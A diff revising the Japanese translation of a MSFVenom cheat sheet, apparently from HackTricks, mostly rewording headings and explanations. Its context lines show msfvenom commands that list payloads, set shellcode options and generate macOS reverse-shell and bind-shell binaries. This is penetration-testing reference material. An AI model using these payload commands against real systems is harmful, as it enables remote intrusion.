@@ -1,4 +1,6 @@
-# MSFVenom - CheatSheet
+# MSFVenom - チートシート
+
+{{#include ../../banners/hacktricks-training.md}}
 
 ---
 
@@ -8,14 +10,14 @@
 
 `-a` を使用して payload のアーキテクチャを選択し、`--platform` を使用して対象プラットフォームを選択します。<sup>[[1]](#references)</sup>
 
-## 一覧
+## リスト表示
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-これらのコマンドは、インストールされている framework で利用可能な payload および encoder モジュールを一覧表示します。<sup>[[1]](#references)</sup>
+これらのコマンドは、インストールされた framework で利用可能な payload および encoder モジュールを一覧表示します。<sup>[[1]](#references)</sup>
 
-## shellcode の作成時に共通するパラメータ
+## shellcode 作成時の一般的なパラメータ
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,7 +25,7 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-ここで示すフラグは、バッドキャラクタ、出力形式、encoder、encoding iterationsを選択します。<sup>[[1]](#references)</sup>
+ここで示されているフラグは、bad characters、出力形式、encoder、および encoding の反復回数を選択します。<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -81,7 +83,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **WebベースのPayloads**
+## **Web ベースの Payloads**
 
 ### **PHP**
 
